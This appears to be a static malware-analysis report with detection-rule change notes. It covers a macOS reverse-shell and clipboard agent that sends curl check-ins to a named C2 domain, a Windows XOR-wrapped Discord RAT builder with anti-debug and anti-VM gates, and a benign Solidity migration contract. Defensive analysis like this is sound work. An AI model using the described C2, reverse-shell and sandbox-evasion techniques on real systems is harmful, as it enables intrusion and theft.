evidence: Universal Mach-O with x86_64 and arm64 implementations; not an installer or ordinary clipboard utility.
x86_64 VA 0x100005308 initializes helper configuration, starts a worker thread and repeatedly dispatches tasks, initially every 10 seconds.

VA 0x100001d42 constructs encoded check-in records. VA 0x100001633 sends them with popen(curl --fail --header Content-Type: text/plain --data ... https://dfsjfisafosdikfos.info/api/agnt), reads the response and checks the curl exit status. The decoded response feeds task selection in VA 0x100004d5a.

Protocol bytes use position-dependent multiplication/addition, XOR and rotations; transport text uses a 16-character nibble alphabet. Code strings use stack-immediate XOR/SIMD reconstruction, recovered statically; no malware execution or live C2 requests were used.

VA 0x10000427c resolves a task-supplied host/service, creates and connects a TCP socket, forks and detaches. At 0x10000440d, 0x100004420 and 0x100004436 the same socket is duplicated to descriptors 0, 1 and 2. The child decodes /bin/zsh and -i on the stack and calls execve at 0x1000044fc.

Task handlers reach VA 0x1000009b0 (generalPasteboard -> stringForType: -> UTF8String) and VA 0x100000a73 (clearContents -> setString:forType:). This supports remote clipboard acquisition and modification. The collection trait deliberately claims co-occurrence with the reverse shell, not a statically bound clipboard-to-send chain.
VA 0x100003518 runs system_profiler -json SPSoftwareDataType SPHardwareDataType and captures its output.

VA 0x1000024be decodes incoming replacement bytes, writes a .upd image, adds owner execute permission via filesystem::__permissions, renames it over the agent path and execve-restarts with preserved arguments.

Home-relative .hlpr/.agnt files include .guid, .ownrid and .passwd helper configuration. Reading that private .passwd is not evidence of stealing the macOS account password or browser/keychain credentials.
limitations: No specific malware family is attributed; vendor stealer labels are not proof of browser or keychain theft.
New native-code signatures cover the x86_64 implementation and therefore this universal sample; no arm64-only coverage is claimed.

samples.identification: Discord RAT builder in native XOR/CLR wrapper
evidence: Native PE entry 0x402000 opens its own image. Footer at EOF-268 contains payload offset 0x2000, size 10240, flags 0x0f and a 256-byte key. Loop at 0x402147 computes output[i] = input[i] XOR key[i & 255]. Static extraction yields a valid .NET PE named builder.exe.

With footer flag 0x02, function 0x4025ce checks IsDebuggerPresent, PEB BeingDebugged, NtGlobalFlag mask 0x70, CheckRemoteDebuggerPresent and ProcessDebugPort (class 7), plus debugger-output and sleep timing. Positive results reach ExitProcess at 0x40267e.

With footer flag 0x08, function 0x402686 probes CPUID hypervisor vendors, VM guest registry keys/drivers, loaded sandbox/AV DLLs, Wine export, WDAGUtilityAccount and process count (<30), followed by an RDTSC timing gate. Detection reaches self-termination at 0x4028fd.

The native host initializes CLR v4.0.30319, copies the decoded image into a VT_UI1 SafeArray, invokes AppDomain.Load(byte[]) at vtable offset 0xb4, resolves its EntryPoint and invokes it. The decoded assembly is not written to disk by this wrapper.

Managed Program.Main runs Form1. InitializeComponent labels the inputs Bot token and Guild id. button1_Click loads .\Release\Discord rat.exe through dnlib, finds type Discord_rat.settings and its .cctor, replaces instruction operands 0 and 2 with the supplied inputs, and writes .\Client-built.exe. This establishes a dedicated RAT configurator, not an AsyncRAT implant inferred from engine names.

No embedded RAT client, dnlib DLL, URL or downloader supplies the missing local client template. The two suspicious traits describe proven wrapper evasion; no hostile network, credential-theft, injection, persistence or RAT command execution is invented for the builder itself.
limitations: The absent Discord RAT client template cannot be reverse-engineered from this specimen; its commands and network behavior are not attributed to this file.

evidence: Entire 378-byte source reviewed. Constructor sets owner=msg.sender. restricted executes the modified body only when msg.sender==owner; other callers produce a no-op. setCompleted only stores the caller-provided migration number. Public state generates read-only getters.

No transfers, token allowances, external calls, delegatecall, selfdestruct, dynamic code, imports, dependencies, referenced URLs, obfuscation or executable off-chain hooks exist. There is no payload or dependency to fetch.

The source resembles a standard deployment migration tracker. A source label may reflect its enclosing project or collection context, a common-template association or simple mislabeling; none of those establishes hostile behavior in this file.

trait_changes: Added key-independent stack-XOR shell-argument recognition, stdio triplet mechanics, an outbound reverse-shell composite and a separate hostile-agent clipboard-acquisition composite.
Added notable clipboard-read selector, C++ filesystem permission import and cyclic XOR decoder observations; added suspicious instruction-level PEB debugger and CPUID VM gates.

Relocated popen to shell creation, generic PEB reads to process information, execve/dup2 co-occurrence to exec, VM artifact references to neutral virtualization and whole-file sentence population to file/profile/string-population. Updated exact consumers and audited broader selectors.

Replaced the misleading credential-theft/root-read entitlement composite with a notable shell-API/read-entitlement observation. The matcher requires only entitlement presence, not a root path or secret access.
The relocated VM-artifact exclusion roster now uses a bounded text expression; an artifact reference alone is no longer a VM-detection objective.
